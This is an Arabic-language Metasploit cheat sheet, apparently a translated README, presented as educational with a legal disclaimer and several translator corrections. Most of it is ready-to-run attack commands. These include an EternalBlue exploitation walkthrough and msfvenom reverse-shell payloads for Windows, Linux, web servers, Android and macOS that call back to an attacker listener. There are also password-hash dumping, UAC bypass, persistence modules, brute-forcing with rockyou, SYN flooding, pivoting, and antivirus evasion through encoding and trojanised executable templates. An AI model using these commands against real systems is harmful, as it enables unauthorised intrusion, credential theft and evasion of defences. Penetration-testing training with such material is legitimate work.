<a id="-metasploit-framework---complete-cheatsheet"></a>
# 🔴 Metasploit Framework — دليل مرجعي شامل

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![الترخيص](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **إطار اختبار الاختراق الأكثر استخداماً في العالم وفق وصف الأصل** - دليلك الشامل لإتقان Metasploit

---

<a id="-table-of-contents"></a>
## 📋 جدول المحتويات

- [مقدمة](#-introduction)
- [التثبيت](#-installation)
- [نظرة عامة على البنية](#-architecture-overview)
- [بدء تشغيل Metasploit](#-starting-metasploit)
- [الأوامر الأساسية](#-basic-commands)
- [أنواع الوحدات](#-module-types)
- [سير عمل الاستغلال](#-exploitation-workflow)
- [التكامل مع قاعدة البيانات](#-database-integration)
- [الفحص وحصر المعلومات](#-scanning--enumeration)
- [توليد الحمولات باستخدام msfvenom](#-payload-generation-msfvenom)
- [ما بعد الاستغلال](#-post-exploitation)
- [الوحدات المساعدة (Auxiliary)](#-auxiliary-modules)
- [أمثلة عملية](#-real-world-examples)
- [جداول مرجعية سريعة](#-quick-reference-tables)
- [نصائح وأفضل الممارسات](#-tips--best-practices)
- [المراجع](#-resources)

---

<a id="-introduction"></a>
## 🎯 مقدمة

**Metasploit Framework** منصة مفتوحة المصدر لاختبار الاختراق وتطوير شيفرات الاستغلال. توفر:

- 🔍 **جمع المعلومات** وفحص الثغرات
- 💉 **تطوير شيفرات الاستغلال** وإيصالها إلى الهدف
- 🎭 **توليد الحمولات (Payloads)** لمنصات متعددة
- 🔐 أدوات وتقنيات **ما بعد الاستغلال**
- 📊 **إعداد التقارير** وإمكانات التوثيق

<a id="key-components"></a>
### المكونات الأساسية

| المكوّن | الوصف |
|-----------|-------------|
| `msfconsole` | واجهة سطر الأوامر الرئيسية |
| `msfvenom` | مولّد حمولات وأداة لترميزها |
| `msfdb` | أداة لإدارة قاعدة البيانات |
| `msfrpcd` | خدمة RPC للوصول عن بُعد |

---

<a id="-installation"></a>
## 📥 التثبيت

<a id="kali-linux-pre-installed"></a>
### Kali Linux (مثبت مسبقاً)
```bash
# تحديث Metasploit
sudo apt update && sudo apt install metasploit-framework
```

<a id="ubuntudebian"></a>
### Ubuntu/Debian
```bash
# تثبيت الاعتماديات
sudo apt install curl gnupg2 software-properties-common

# إضافة مستودع Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

<a id="docker"></a>
### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

<a id="windows-not-recommended-for-production"></a>
### Windows (غير موصى به للإنتاج وفق الأصل)
```powershell
# تنزيل المثبّت من: https://windows.metasploit.com/
# تشغيل المثبّت واتباع التعليمات
```

---

<a id="-architecture-overview"></a>
## 🏗️ نظرة عامة على البنية

> **دليل الرسم:** يبيّن المخطط عائلات الوحدات: الاستغلالات والحمولات والأدوات المساعدة وما بعد الاستغلال والترميز وNOP والتفادي والإضافات، ثم واجهات التحكم وقاعدة PostgreSQL. أعداد الوحدات تقريبية مأخوذة من الأصل وليست إحصاءً للإصدار الحالي.


```
┌─────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ EXPLOITS │  │ PAYLOADS │  │AUXILIARY │  │   POST   │    │
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ ENCODERS │  │   NOPS   │  │ EVASION  │  │ PLUGINS  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                      INTERFACES                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
├─────────────────────────────────────────────────────────────┤
│                 DATABASE (PostgreSQL)                        │
└─────────────────────────────────────────────────────────────┘
```

<a id="directory-structure"></a>
### بنية المجلدات
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # وحدات الاستغلال
│   ├── payloads/      # وحدات الحمولات
│   ├── auxiliary/     # الفحص واختبار Fuzzing وغيرها
│   ├── post/          # ما بعد الاستغلال
│   ├── encoders/      # أدوات ترميز الحمولات
│   ├── nops/          # مولّدات NOP
│   └── evasion/       # وحدات تفادي مكافحة الفيروسات
├── tools/             # أدوات إضافية
├── scripts/           # سكربتات Meterpreter
├── data/              # قوائم كلمات وقوالب
└── plugins/           # إضافات واجهة التحكم
```

---

<a id="-starting-metasploit"></a>
## 🚀 بدء تشغيل Metasploit

<a id="initialize-database-first-time"></a>
### تهيئة قاعدة البيانات للمرة الأولى
```bash
# تشغيل خدمة PostgreSQL
sudo systemctl start postgresql

# تهيئة قاعدة البيانات
sudo msfdb init

# فحص حالة قاعدة البيانات
sudo msfdb status
```

<a id="launch-msfconsole"></a>
### تشغيل msfconsole
```bash
# التشغيل العادي
msfconsole

# وضع هادئ دون لافتة
msfconsole -q

# تنفيذ أوامر عند بدء التشغيل
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# تحميل ملف موارد
msfconsole -r commands.rc
```

---

<a id="-basic-commands"></a>
## ⌨️ الأوامر الأساسية

<a id="navigation--help"></a>
### التنقل والمساعدة

| الأمر | الوصف |
|---------|-------------|
| `help` أو `?` | عرض قائمة المساعدة |
| `help <command>` | مساعدة لأمر محدد |
| `search <term>` | البحث عن الوحدات بالاسم أو CVE أو المنصة |
| `use <module>` | اختيار وحدة |
| `back` | الخروج من الوحدة الحالية |
| `info` | عرض معلومات الوحدة |
| `show options` | عرض خيارات الوحدة |
| `show advanced` | عرض الخيارات المتقدمة |
| `show payloads` | عرض الحمولات المتوافقة |
| `show targets` | عرض الأهداف المتاحة |

<a id="module-configuration"></a>
### إعداد الوحدة

```bash
# ضبط الخيارات
set RHOSTS 192.168.1.100          # عنوان IP للهدف
set RPORT 445                      # منفذ الهدف
set LHOST 192.168.1.50            # عنوان IP المحلي للمهاجم
set LPORT 4444                     # المنفذ المحلي للمستمع
set PAYLOAD windows/meterpreter/reverse_tcp

# الضبط على مستوى عام ليستمر بين الوحدات
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# إلغاء ضبط الخيارات
unset RHOSTS
unsetg LHOST

# فحص الإعدادات الحالية
show options
check                              # التحقق من قابلية الهدف للاستغلال
```

<a id="execution"></a>
### التنفيذ

```bash
# تشغيل الاستغلال
exploit
run

# التشغيل في الخلفية
exploit -j

# التشغيل بخيارات محددة
exploit -z                         # عدم التفاعل مع الجلسة بعد النجاح
```

<a id="session-management"></a>
### إدارة الجلسات

```bash
# عرض الجلسات
sessions
sessions -l

# التفاعل مع جلسة
sessions -i 1

# إنهاء جلسة
sessions -k 1

# إنهاء جميع الجلسات
sessions -K

# ترقية صدفة الأوامر إلى Meterpreter
sessions -u 1

# تنفيذ أمر على جميع الجلسات
sessions -c "sysinfo"
```

---

<a id="-module-types"></a>
## 📦 أنواع الوحدات

<a id="1-exploits"></a>
### 1. الاستغلالات (Exploits)
وحدات تستغل الثغرات.

```bash
# البحث عن استغلالات
search type:exploit platform:windows

# مثال
use exploit/windows/smb/ms17_010_eternalblue
```

<a id="2-payloads"></a>
### 2. الحمولات (Payloads)
شيفرة تُنفذ بعد نجاح الاستغلال.

**الأنواع:**
- **Singles** - حمولات مكتفية ذاتياً
- **Stagers** - تُنشئ الاتصال بين المهاجم والهدف
- **Stages** - مراحل تُحمّلها وحدات Stager؛ من أمثلتها Meterpreter

```bash
# عرض الحمولات
show payloads

# نمط تسمية الحمولات
<platform>/<arch>/<type>/<connection>
# مثال: windows/x64/meterpreter/reverse_tcp
```

<a id="3-auxiliary"></a>
### 3. المساعدة (Auxiliary)
الفحص واختبار المدخلات المتغيرة (Fuzzing) والتقاط حركة المرور وغيرها.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

<a id="4-post"></a>
### 4. ما بعد الاستغلال (Post)
وحدات ما بعد الاستغلال.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

<a id="5-encoders"></a>
### 5. أدوات الترميز (Encoders)

> **تصحيح:** الغرض الأساسي من Encoder معالجة البايتات غير الملائمة في سياق الاستغلال؛ الترميز أو تكراره لا يضمن تجاوز مكافحة الفيروسات. راجع [التوضيح الرسمي من Rapid7](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus/). ينطبق هذا التنبيه أيضاً على اقتراحات التفادي واستكشاف المشكلات لاحقاً.

ترميز الحمولات بقصد تفادي الرصد وفق وصف الأصل؛ انظر التوضيح أدناه.

```bash
show encoders
# مثال: x86/shikata_ga_nai
```

---

<a id="-exploitation-workflow"></a>
## 🎯 سير عمل الاستغلال

> **دليل الرسم:** يبدأ التسلسل بالاستطلاع وحصر المعلومات، ثم اختيار الوحدة وضبط خياراتها، ثم فحص الهدف واستغلاله، وأخيراً مرحلة ما بعد الاستغلال. احتُفظ بالرسم الإنجليزي ثابت العرض للحفاظ على اصطفافه.


```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   RECON &    │───▶│    SELECT    │───▶│  CONFIGURE   │
│  ENUMERATION │    │    MODULE    │    │   OPTIONS    │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    POST-     │◀───│   EXPLOIT    │◀───│    CHECK     │
│ EXPLOITATION │    │    TARGET    │    │    TARGET    │
└──────────────┘    └──────────────┘    └──────────────┘
```

<a id="step-by-step-example"></a>
### مثال خطوة بخطوة

```bash
# 1. البحث عن استغلال
msf6 > search eternalblue

# 2. اختيار وحدة
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. عرض الخيارات
msf6 exploit(ms17_010_eternalblue) > show options

# 4. ضبط الهدف
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. ضبط الحمولة
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. ضبط المستمع
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. التحقق من الثغرة (اختياري)
msf6 exploit(ms17_010_eternalblue) > check

# 8. التنفيذ
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

<a id="-database-integration"></a>
## 🗄️ التكامل مع قاعدة البيانات

<a id="setup--connection"></a>
### الإعداد والاتصال

```bash
# تهيئة قاعدة البيانات
msfdb init

# الاتصال بقاعدة البيانات
db_connect msf:password@127.0.0.1/msf

# فحص الحالة
db_status

# قطع الاتصال
db_disconnect
```

<a id="workspace-management"></a>
### إدارة مساحات العمل

```bash
# عرض مساحات العمل
workspace

# إنشاء مساحة عمل
workspace -a pentest_project

# تبديل مساحة العمل
workspace pentest_project

# حذف مساحة عمل
workspace -d old_project

# إعادة تسمية مساحة عمل
workspace -r old_name new_name
```

<a id="host-management"></a>
### إدارة الأجهزة

```bash
# عرض الأجهزة
hosts

# إضافة جهاز يدوياً
hosts -a 192.168.1.100

# حذف جهاز
hosts -d 192.168.1.100

# البحث عن أجهزة
hosts -S windows

# تصدير الأجهزة
hosts -o /tmp/hosts.csv
```

<a id="service-management"></a>
### إدارة الخدمات

```bash
# عرض الخدمات
services

# التصفية بحسب المنفذ
services -p 80,443

# التصفية بحسب اسم الخدمة
services -s http

# البحث عن الخدمات
services -S microsoft
```

<a id="vulnerability-management"></a>
### إدارة الثغرات

```bash
# عرض الثغرات
vulns

# إضافة ثغرة
vulns -a 192.168.1.100 -n "MS17-010"
```

<a id="importexport"></a>
### الاستيراد والتصدير

```bash
# استيراد فحص Nmap
db_import /path/to/nmap_scan.xml

# استيراد فحص Nessus
db_import /path/to/nessus_scan.nessus

# تشغيل Nmap مباشرة
db_nmap -sV -O 192.168.1.0/24

# تصدير البيانات
hosts -o hosts.csv
services -o services.csv
```

---

<a id="-scanning--enumeration"></a>
## 🔍 الفحص وحصر المعلومات

<a id="port-scanning"></a>
### فحص المنافذ

```bash
# فحص TCP SYN
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# فحص اتصال TCP
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

<a id="service-enumeration"></a>
### حصر الخدمات

```bash
# حصر معلومات SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# مشاركات SMB
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# إصدار SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# إصدار HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# حصر معلومات FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

<a id="vulnerability-scanning"></a>
### فحص الثغرات

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# فاحص ثغرة HTTP
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

<a id="-payload-generation-msfvenom"></a>
## 💉 توليد الحمولات باستخدام msfvenom

<a id="basic-syntax"></a>
### الصيغة الأساسية
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

<a id="common-options"></a>
### خيارات شائعة

| الخيار | الوصف |
|--------|-------------|
| `-p` | الحمولة المستخدمة |
| `-f` | صيغة الإخراج |
| `-o` | ملف الإخراج |
| `-e` | أداة الترميز المستخدمة |
| `-i` | مرات تكرار الترميز |
| `-b` | البايتات غير الملائمة المطلوب تجنبها |
| `-n` | حجم سلسلة تعليمات NOP |
| `--platform` | المنصة المستهدفة |
| `-a` | المعمارية |
| `LHOST` | عنوان IP للمستمع |
| `LPORT` | منفذ المستمع |

<a id="windows-payloads"></a>
### حمولات Windows

```bash
# اتصال TCP عكسي باستخدام Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# اتصال TCP عكسي بمعمارية x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# اتصال HTTPS عكسي مشفّر
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# الاستماع لاتصال TCP وارد
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# مع الترميز بقصد تفادي مكافحة الفيروسات وفق الأصل
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

<a id="linux-payloads"></a>
### حمولات Linux

```bash
# اتصال TCP عكسي
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# اتصال TCP عكسي بمعمارية x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# صدفة تستمع لاتصال وارد (Bind Shell)
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

<a id="web-payloads"></a>
### حمولات الويب

```bash
# صدفة عكسية بلغة PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# صدفة عكسية ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# صدفة عكسية ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# صدفة عكسية JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# ملف WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

<a id="scripting-payloads"></a>
### حمولات لغات السكربت

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# ماكرو VBA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

<a id="android-payloads"></a>
### حمولات Android

```bash
# اتصال TCP عكسي على Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

<a id="macos-payloads"></a>
### حمولات macOS

```bash
# اتصال TCP عكسي على macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

<a id="multihandler-setup"></a>
### إعداد Multi/Handler

```bash
# بدء المستمع
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

<a id="-post-exploitation"></a>
## 🔓 ما بعد الاستغلال

<a id="basic-post-modules"></a>
### وحدات أساسية لما بعد الاستغلال

```bash
# عرض معلومات النظام
use post/windows/gather/enum_system

# عرض المستخدمين المسجلين حالياً
use post/windows/gather/enum_logged_on_users

# استخراج بصمات كلمات المرور
use post/windows/gather/hashdump

# استخراج بيانات الاعتماد من الذاكرة
use post/windows/gather/credentials/credential_collector

# فحص الآلة الافتراضية
use post/windows/gather/checkvm
```

<a id="privilege-escalation"></a>
### تصعيد الصلاحيات

```bash
# اقتراح استغلالات تصعيد صلاحيات Windows
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# تجاوز UAC
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# الحصول على SYSTEM
use post/windows/escalate/getsystem
```

<a id="persistence"></a>
### ترسيخ الوصول (Persistence)

> **ملاحظة على التسميات:** يصف الأصل بعض الأمثلة بأنها ترسيخ عبر السجل أو مهمة مجدولة، بينما أسماء الوحدات المذكورة تشير إلى وسائل أخرى. افحص `info` و`show options` للوحدة المتاحة؛ أُبقيت أسماء الوحدات كما وردت دون تصحيح تنفيذي.


```bash
# ترسيخ الوصول عبر السجل
use exploit/windows/local/persistence_service
set SESSION 1
run

# ترسيخ الوصول عبر مهمة مجدولة
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

<a id="-auxiliary-modules"></a>
## 🔧 الوحدات المساعدة (Auxiliary)

<a id="brute-force"></a>
### القوة الغاشمة (Brute Force)

```bash
# تخمين بيانات SSH بالقوة الغاشمة
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# تخمين بيانات SMB بالقوة الغاشمة
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# تخمين بيانات FTP بالقوة الغاشمة
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

<a id="sniffing"></a>
### التقاط حركة المرور (Sniffing)

```bash
# التقاط كلمات مرور HTTP
use auxiliary/sniffer/psnuffle
run

# التقاط الحزم
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

<a id="dos-testing-only"></a>
### حجب الخدمة (للاختبار فقط)

```bash
# إغراق SYN
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

<a id="-real-world-examples"></a>
## 🎬 أمثلة عملية

<a id="example-1-eternalblue-attack-ms17-010"></a>
### المثال 1: هجوم EternalBlue (MS17-010)

```bash
# تشغيل Metasploit
msfconsole -q

# البحث عن استغلال
search eternalblue

# اختيار الاستغلال
use exploit/windows/smb/ms17_010_eternalblue

# ضبط الإعدادات
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# التحقق من قابلية الاستغلال
check

# الاستغلال
exploit
```

<a id="example-2-web-application-attack"></a>
### المثال 2: هجوم على تطبيق ويب

> **ملاحظة على المثال:** أسماء الوحدات والمسارات هنا كما في الأصل؛ لا تُفترض قابلية تطبيق وحدة رفع ملفات عامة على أي هدف. يجب أن تتطابق الوحدة الفعلية ومتطلباتها مع التطبيق ونسخته؛ المثال ليس إثباتاً لوجود ثغرة بمجرد اكتشاف مجلد.


```bash
# فحص الثغرات
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# استغلال رفع الملفات
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

<a id="example-3-multi-handler-with-msfvenom"></a>
### المثال 3: Multi-Handler مع msfvenom

```bash
# الطرفية 1: توليد الحمولة
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# الطرفية 2: بدء معالج الاتصالات
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# نقل payload.exe إلى الهدف وتشغيله
# ستتصل الجلسة بمعالج الاتصالات
```

<a id="example-4-pivoting-through-compromised-host"></a>
### المثال 4: العبور الشبكي عبر جهاز مخترق

```bash
# بعد الحصول على جلسة Meterpreter
meterpreter > run autoroute -s 10.10.10.0/24

# أو من msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# فحص الشبكة الداخلية الآن
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

<a id="-quick-reference-tables"></a>
## 📊 جداول مرجعية سريعة

<a id="essential-commands"></a>
### الأوامر الضرورية

| الأمر | الوصف |
|---------|-------------|
| `search <term>` | البحث عن الوحدات |
| `use <module>` | اختيار وحدة |
| `show options` | عرض الخيارات |
| `set <opt> <val>` | ضبط قيمة الخيار |
| `exploit` / `run` | تنفيذ الوحدة |
| `back` | العودة إلى الواجهة الرئيسية |
| `sessions -l` | عرض الجلسات |
| `sessions -i <id>` | التفاعل مع جلسة |

<a id="common-payloads"></a>
### حمولات شائعة

| الحمولة | الوصف |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Meterpreter لـ Windows بمعمارية 32 بت |
| `windows/x64/meterpreter/reverse_tcp` | Meterpreter لـ Windows بمعمارية 64 بت |
| `windows/meterpreter/reverse_https` | اتصال مشفّر |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter لـ Linux |
| `php/meterpreter/reverse_tcp` | Meterpreter بلغة PHP |
| `java/jsp_shell_reverse_tcp` | صدفة أوامر Java/JSP |
| `android/meterpreter/reverse_tcp` | Meterpreter لـ Android |

<a id="output-formats-msfvenom"></a>
### صيغ الإخراج في msfvenom

| الصيغة | الامتداد | الاستخدام |
|--------|-----------|----------|
| `exe` | .exe | ملف تنفيذي لـ Windows |
| `elf` | (بلا امتداد) | ملف تنفيذي لـ Linux |
| `macho` | (بلا امتداد) | ملف تنفيذي لـ macOS |
| `raw` | متغير | Shellcode خام |
| `asp` | .asp | خادم ويب IIS |
| `aspx` | .aspx | خادم ويب .NET |
| `php` | .php | خادم ويب PHP |
| `jsp` | .jsp | خادم ويب Java |
| `war` | .war | النشر على Tomcat |
| `psh` | .ps1 | سكربت PowerShell |
| `vba` | .vba | ماكرو Office |
| `dll` | .dll | مكتبة Windows |

<a id="popular-encoders"></a>
### أدوات ترميز شائعة

| أداة الترميز | الوصف |
|---------|-------------|
| `x86/shikata_ga_nai` | أداة ترميز XOR متعددة الأشكال |
| `x64/xor` | أداة ترميز XOR بمعمارية 64 بت |
| `x86/alpha_mixed` | أداة ترميز بأحرف وأرقام |
| `php/base64` | أداة ترميز Base64 لـ PHP |

---

<a id="-tips--best-practices"></a>
## 💡 نصائح وأفضل الممارسات

<a id="-legal-disclaimer"></a>
### ⚠️ تنبيه قانوني
> **مهم:** استخدم Metasploit فقط على الأنظمة التي تملكها أو لديك إذن كتابي صريح لاختبارها. الوصول غير المصرح به إلى أنظمة الحاسوب مخالف للقانون.

<a id="performance-tips"></a>
### نصائح الأداء

1. **استخدام قاعدة البيانات**
   ```bash
   # تهيئة قاعدة البيانات واستخدامها دائماً
   msfdb init
   db_status
   ```

2. **استخدام مساحات العمل**
   ```bash
   workspace -a client_pentest
   ```

3. **سكربتات الموارد (Resource Scripts)**
   ```bash
   # حفظ الأوامر في ملف .rc
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # تشغيل السكربت
   msfconsole -r handler.rc
   ```

4. **استخدام خيوط التنفيذ بحكمة**
   ```bash
   set THREADS 10  # تجنب إرهاق الهدف
   ```

<a id="evasion-techniques"></a>
### تقنيات تفادي الرصد

1. **الترميز المتكرر**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **قوالب مخصصة**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **استخدام حمولات HTTPS**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

<a id="troubleshooting"></a>
### استكشاف المشكلات وحلها

| المشكلة | الحل |
|-------|----------|
| تعذر الاتصال بقاعدة البيانات | `msfdb reinit` |
| تعذر تحميل الوحدة | `reload_all` |
| انقطاع الجلسة فوراً | فحص مكافحة الفيروسات واستخدام حمولة مرمّزة وفق اقتراح الأصل |
| فشل الاستغلال | فحص إصدار نظام الهدف وتجربة هدف مختلف |

---

<a id="-resources"></a>
## 📚 المراجع

<a id="official-documentation"></a>
### التوثيق الرسمي
- [توثيق Metasploit](https://docs.metasploit.com/)
- [مدونة Rapid7](https://www.rapid7.com/blog/)
- [مستودع Metasploit على GitHub](https://github.com/rapid7/metasploit-framework)

<a id="learning-resources"></a>
### مراجع التعلم
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

<a id="cheatsheets"></a>
### الأدلة المرجعية
- [دليل SANS المرجعي لـ Metasploit](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [دليل Meterpreter المرجعي](./Meterpreter.ar.md)

---

<a id="-license"></a>
## 📄 الترخيص

هذا الدليل مقدم لأغراض تعليمية فقط. استخدمه بمسؤولية وبصورة أخلاقية.

---

<p align="center">
  <b>اختبار اختراق موفق! 🔴</b><br>
  <i>تذكّر: مع القوة الكبيرة تأتي مسؤولية كبيرة</i>
</p>
